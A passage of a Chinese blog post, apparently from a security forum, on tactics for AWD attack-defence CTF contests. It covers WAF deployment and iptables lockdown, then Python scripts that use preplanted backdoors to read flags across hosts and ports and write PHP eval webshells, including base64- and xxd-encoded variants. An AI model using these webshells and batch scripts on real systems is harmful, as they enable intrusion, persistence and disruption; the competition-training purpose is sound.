+<p>有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。</p>
+<p>常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include './waf.php'或者 require_once('waf.php');<br>
+    如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用</p>
+<p>网上很多waf脚本，这里介绍几个waf项目<br>
+<a href="https://blog.csdn.net/lkbzhj/article/details/124590023" target="_blank"></a><br>
+<strong>1.AWD_PHP_WAF</strong><br>
+项目地址：<a href="https://github.com/NonupleBroken/AWD_PHP_WAF" target="_blank">https://github.com/NonupleBroken/AWD_PHP_WAF</a></p>
+<p>使用方法：<br>
+使用前先修改config.php内的密码，密码使用sha256加密</p>
+<div class="highlight"><pre><span></span>上waf：
+$ find . -path ./waffffff -prune -o -type f -name <span class="s2">"*.php"</span> -print <span class="p">|</span> xargs sed -i <span class="s2">"s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/g"</span>
+
+下waf：
+$ find . -path ./waffffff -prune -o -type f -name <span class="s2">"*.php"</span> -print <span class="p">|</span> xargs sed -i <span class="s2">"s/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/&lt;?php/g"</span>
+</pre></div>
+<p>比如访问 web 目录下的/waffffff/admin.php?password=123456</p>
+<p><strong>2.CTF-WAF</strong><br>
+项目地址：<a href="https://github.com/sharpleung/CTF-WAF" target="_blank">https://github.com/sharpleung/CTF-WAF</a></p>
+<p><strong>3.awd-watchbird</strong><br>
+这是个通防waf，支持流量转发和替换flag<br>
+项目地址：<a href="https://github.com/leohearts/awd-watchbird" target="_blank">https://github.com/leohearts/awd-watchbird</a></p>
+<p>1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令</p>
+<div class="highlight"><pre><span></span>php watchbird.php --install /var/www/html
+</pre></div>
+<p>这样就能使每个页面的php代码包含到waf下</p>
+<p>2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird=ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码)</p>
+<p>3.配置好之后就能进入内部网页</p>
+<p><strong>4.AoiAWD</strong><br>
+项目地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD" target="_blank">https://github.com/DasSecurity-HatLab/AoiAWD</a></p>
+<p>使用方法：<a href="https://www.wlhhlc.top/posts/16692/" target="_blank">AoiAWD-萌新的得分利器</a><br>
+下载好，自己去编译或者找编译好的直接用</p>
+<h2 id="toc-26">防御搅屎</h2>
+<p>在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落...</p>
+<p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。</p>
+<p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。</p>
+<p>首先开启  22 80 21</p>
+<div class="highlight"><pre><span></span>iptables -A INPUT -p tcp --dport <span class="m">80</span> -j ACCEPT
+iptables -A INPUT -p tcp --dport <span class="m">22</span> -j ACCEPT
+iptables -A INPUT -p tcp --dport <span class="m">21</span> -j ACCEPT
+</pre></div>
+<p>然后关闭</p>
+<div class="highlight"><pre><span></span>iptables -A INPUT -j DROP
+</pre></div>
+<p>在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。</p>
+<p>遍历整个IP段，并将防火墙开启全部屏蔽掉~~</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.182"</span>
+<span class="n">port</span><span class="o">=</span><span class="s1">'80'</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="s2">"/shell.php"</span>
+<span class="n">passwd</span> <span class="o">=</span> <span class="s2">"a"</span>
+<span class="n">payloads</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">passwd</span><span class="p">:</span><span class="s2">"system(</span><span class="se">\'</span><span class="s2">iptables -A INPUT -j DROP');"</span>
+<span class="p">}</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">):</span>
+    <span class="n">urls</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s2">"."</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">":"</span><span class="o">+</span><span class="n">port</span><span class="o">+</span><span class="n">shell</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">urls</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urls</span><span class="p">,</span><span class="n">payloads</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"未找到主机"</span><span class="p">)</span>
+</pre></div>
+<h1>编写批量脚本</h1>
+<p>以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。</p>
+<h3 id="toc-27">1.利用后门getflag</h3>
+<p>单个shell获取flag</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span><span class="o">=</span><span class="s2">"http://192.168.182.130/include/shell.php"</span>
+<span class="n">passwd</span><span class="o">=</span><span class="s2">"admin_ccmd"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="n">passwd</span><span class="p">:</span> <span class="s1">'system(</span><span class="se">\'</span><span class="s1">cat /f*</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+<span class="n">res</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</pre></div>
+<h3 id="toc-28">2.后门批量getflag</h3>
+<p>针对端口变化利用后门批量获取flag</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url1</span><span class="o">=</span><span class="s2">"http://192.168.182.130:"</span>
+<span class="n">url2</span><span class="o">=</span><span class="s2">""</span>
+
+<span class="n">flaglist</span><span class="o">=</span><span class="p">[]</span>
+
+<span class="n">path</span><span class="o">=</span><span class="s2">"/include/shell.php"</span>
+<span class="n">passwd</span><span class="o">=</span><span class="s2">"admin_ccmd"</span>
+
+
+<span class="c1">#payload = {passwd: 'system(\'cat /f*\');'}</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="n">passwd</span><span class="p">:</span> <span class="s1">'system(</span><span class="se">\'</span><span class="s1">cat /flag</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">for</span> <span class="n">url2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8801</span><span class="p">,</span><span class="mi">8805</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">url1</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span> <span class="o">+</span><span class="n">path</span>
+
+    <span class="n">res</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">url1</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">url2</span><span class="p">),</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="c1"># flag存入列表中</span>
+        <span class="n">flaglist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">))</span>
+        <span class="c1">#print(flaglist[i])</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+</pre></div>
+<h3 id="toc-29">3.利用后门批量getflag并提交</h3>
+<p>burp抓包，发现flag以json形式传输</p>
+<div class="highlight"><pre><span></span><span class="x">POST /api/flag HTTP/1.1</span>
+<span class="x">Host: 192.168.182.130:39999</span>
+<span class="x">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span>
+<span class="x">Accept: application/json, text/plain, */*</span>
+<span class="x">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="x">Accept-Encoding: gzip, deflate</span>
+<span class="x">Content-Type: application/json;charset=utf-8</span>
+<span class="x">Authorization: 9ad36c305d6a2d2514434a4c10e7e13f</span>
+<span class="x">Content-Length: 55</span>
+<span class="x">Origin: http://192.168.182.130:39999</span>
+<span class="x">Connection: close</span>
+<span class="x">Referer: http://192.168.182.130:39999/</span>
+
+<span class="x">{"flag":"SL{7a2ecc20361b7a104798b6bba6222b3972e114a2}"}</span>
+</pre></div>
+<p>编写脚本自动获取flag并提交</p>
+<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">url1</span><span class="o">=</span><span class="s2">"http://xxxx:"</span>
+<span class="n">url2</span><span class="o">=</span><span class="s2">""</span>
+
+<span class="n">flaglist</span><span class="o">=</span><span class="p">[]</span>
+
+<span class="n">path</span><span class="o">=</span><span class="s2">"/include/shell.php"</span>
+<span class="n">passwd</span><span class="o">=</span><span class="s2">"admin_ccmd"</span>
+
+<span class="n">flagadd</span><span class="o">=</span><span class="s2">"http://xxxx:8801/api/flag"</span>   <span class="c1">#提交flag的地址</span>
+
+<span class="c1">#payload = {passwd: 'system(\'cat /f*\');'}</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="n">passwd</span><span class="p">:</span> <span class="s1">'system(</span><span class="se">\'</span><span class="s1">cat /flag</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+
+
+<span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+        <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'</span><span class="p">,</span>
+    <span class="p">}</span>
+<span class="n">headersflag</span><span class="o">=</span><span class="p">{</span>
+        <span class="s1">'Host'</span><span class="p">:</span> <span class="s1">'xxxx'</span><span class="p">,</span>
+        <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'</span><span class="p">,</span>
+        <span class="s1">'Accept'</span><span class="p">:</span> <span class="s1">'application/json, text/plain, */*'</span><span class="p">,</span>
+        <span class="s1">'Accept-Language'</span><span class="p">:</span> <span class="s1">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="p">,</span>
+        <span class="s1">'Content-Type'</span><span class="p">:</span> <span class="s1">'application/json;charset=utf-8'</span><span class="p">,</span>
+        <span class="s1">'Authorization'</span><span class="p">:</span> <span class="s1">'bada82467423a6526d4d25abbe8cc43a'</span><span class="p">,</span>
+        <span class="s1">'Origin'</span><span class="p">:</span> <span class="s1">'http://xxxx'</span><span class="p">,</span>
+        <span class="s1">'Referer'</span><span class="p">:</span> <span class="s1">'http://xxxx/'</span><span class="p">,</span>
+    <span class="p">}</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">for</span> <span class="n">url2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8802</span><span class="p">,</span><span class="mi">8810</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">url1</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span> <span class="o">+</span><span class="n">path</span>
+    <span class="c1">#print(url1 + str(url2))</span>
+    <span class="n">res</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">url1</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">url2</span><span class="p">),</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="c1"># flag存入列表中</span>
+        <span class="n">flaglist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">))</span>
+        <span class="c1">#print(flaglist[i])</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"flag"</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">flaglist</span><span class="p">[</span><span class="n">i</span><span class="p">])}</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">flagadd</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headersflag</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+</pre></div>
+<p>如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号<code>{}</code>可能会被编码导致flag错误。</p>
+<h3 id="toc-30">4.利用后门写shell</h3>
+<p>预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马<br>
+<strong>利用命令执行写马</strong></p>
+<div class="highlight"><pre><span></span><span class="m">1</span>.Linux下写shell
+$ <span class="nb">echo</span> <span class="s2">"&lt;?php @eval(\$_POST[123]); ?&gt;"</span> &gt; webshell.php
+$ <span class="nb">echo</span> PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg<span class="o">==</span><span class="p">|</span>base64 -d &gt; webshell.php   <span class="c1">#base64编码绕过</span>
+$ <span class="nb">echo</span> 3c3f706870206576616c28245f504f53545b3132335d293b203f3e<span class="p">|</span>xxd -r -ps &gt; webshell.php <span class="c1">#xxd绕过</span>
+
+
+<span class="m">2</span>.windows下写shell
+&gt;echo ^&lt;?php eval<span class="o">(</span>$^_POST<span class="o">[</span><span class="m">123</span><span class="o">])</span><span class="p">;</span> ?^&gt; &gt; webshell.php
+</pre></div>
+<p><strong>利用代码执行写马</strong></p>
+<div class="highlight"><pre><span></span>?code<span class="o">=</span>fputs<span class="o">(</span>fopen<span class="o">(</span><span class="s1">'./webshell.php.php'</span>,<span class="s1">'w'</span><span class="o">)</span>,<span class="s1">'&lt;?php @eval($_POST[123]);?&gt;'</span><span class="o">)</span><span class="p">;</span>
+
+?code<span class="o">=</span>file_put_contents<span class="o">(</span><span class="s1">'webshell.php.php'</span>, <span class="s1">'&lt;?php @eval($_POST[123]); ?&gt; '</span><span class="o">)</span><span class="p">;</span>
+
+?code<span class="o">=</span>file_put_contents<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span>f<span class="o">]</span>, <span class="nv">$_POST</span><span class="o">[</span>d<span class="o">])</span><span class="p">;</span> 
+post: <span class="nv">f</span><span class="o">=</span>webshell.php<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span>&lt;?php @eval<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="m">123</span><span class="o">])</span><span class="p">;</span> ?&gt;
+</pre></div>
+<p>然后利用脚本实现</p>
+<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.182.130:8808"</span>
+
+<span class="n">shell_path</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">"/include/shell.php"</span>
+<span class="n">shell_passwd</span> <span class="o">=</span> <span class="s2">"admin_ccmd"</span>
+
+<span class="c1">#利用预留后门</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="n">shell_passwd</span><span class="p">:</span> <span class="s1">'system(</span><span class="se">\'</span><span class="s1">cat /f*</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">shell_path</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+
+<span class="c1">#payload1利用预留后门上传shell</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="n">shell_passwd</span><span class="p">:</span> <span class="s1">'system(</span><span class="se">\'</span><span class="s1">echo "&lt;?php @eval(\$_POST[atkx]);?&gt;" &gt; /var/www/html/atkx.php</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">shell_path</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">"shell已上传"</span><span class="p">)</span>
+
+<span class="c1">#payload2利用预留后门上传shell，并getflag</span>
+<span class="n">my_shell_path</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">"/atkx.php"</span>
+<span class="n">my_shell_passwd</span> <span class="o">=</span> <span class="s2">"atkx"</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="p">{</span><span class="n">my_shell_passwd</span><span class="p">:</span> <span class="s1">'system(</span><span class="se">\'</span><span class="s1">cat /f*</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">my_shell_path</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</pre></div>
+<p>批量后门写shell</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url_head</span><span class="o">=</span><span class="s2">"http://192.168.182.130"</span>
+<span class="k">for</span> <span class="n">url2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8801</span><span class="p">,</span><span class="mi">8805</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span>  <span class="n">url_head</span><span class="o">+</span><span class="s2">":{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span>
+
+        <span class="n">shell_path</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">"/include/shell.php"</span>
+        <span class="n">shell_passwd</span> <span class="o">=</span> <span class="s2">"admin_ccmd"</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">shell_path</span><span class="p">)</span>
+
+        <span class="c1">#payload1利用预留后门上传shell</span>
+        <span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="n">shell_passwd</span><span class="p">:</span> <span class="s1">'system(</span><span class="se">\'</span><span class="s1">echo "&lt;?php @eval(\$_POST[atkx]);?&gt;" &gt; /var/www/html/atkx1.php</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">shell_path</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">" shell写入成功！！！！！！！"</span><span class="p">)</span>
+        <span class="c1">#</span>
+
+        <span class="c1"># #payload2通过上传的shell来getflag</span>
+        <span class="c1"># my_shell_path = url + "/atkx1.php"</span>
+        <span class="c1"># my_shell_passwd = "atkx"</span>
+        <span class="c1"># payload2 = {my_shell_passwd: 'system(\'cat /flag\');'}</span>
+        <span class="c1"># res = requests.post(my_shell_path, payload2)</span>
+        <span class="c1"># print(url,res.text)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+</pre></div>
+<h1>总结</h1>
+<p>1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。</p>
+<p>2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。</p>
+<p>3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。</p>
+<p>4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。</p>
+<p>5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。</p>
+<p>参考文章：<br>
+<a href="https://blog.csdn.net/weixin_43510203/article/details/118519120" target="_blank">https://blog.csdn.net/weixin_43510203/article/details/118519120</a><br>
+<a href="https://www.likecs.com/show-306005446.html" target="_blank">https://www.likecs.com/show-306005446.html</a><br>
+<a href="https://www.anquanke.com/post/id/86984" target="_blank">https://www.anquanke.com/post/id/86984</a><br>
+<a href="https://xz.aliyun.com/t/10995" target="_blank">https://xz.aliyun.com/t/10995</a></p>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="11409">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">12</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="11409">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">5</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11400" title="记一次企业钓鱼演练"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>记一次企业钓鱼演练</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11412" title="从SQL注入绕过最新安全狗WAF中学习fuzz"><span class="related-label" style="">下一篇：</span>从SQL注入绕过最新安全狗WAF中...</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">2 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            
+                <ul class="post-info" id="reply-18387">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/57592">1280552067396201</a>
+                                
+                                <span class="bbs-time">2022-06-09 11:32:34</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>作者您好，看到您的文章质量很高，具有很强的知识理论，特此向您申请这篇文章的授权，发布在其他平台，供更多的网络爱好者学习。在转载发布时一定会对文章作者等内容进行声明，期待您的回复。</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="18387" data-topic="11409"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="1280552067396201">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-18395">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/47190">Atkx</a>
+                                
+                                <span class="bbs-time">2022-06-09 15:14:09</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p><a href="https://xz.aliyun.com/u/57592" target="_blank">@1280552067396201</a> 好的，不违反先知规则即可</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="18395" data-topic="11409"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="Atkx">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11409&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11409&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/37846_ed0c5102d8f11328a1.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">54</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/66399" title="F4atherw1t">F4atherw1t</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">14</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame">Ic4_F1ame</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">14</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">12</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/55880" title="Sentiment">Sentiment</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">11</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/66399" title="F4atherw1t" style="">F4atherw1t</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">6</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
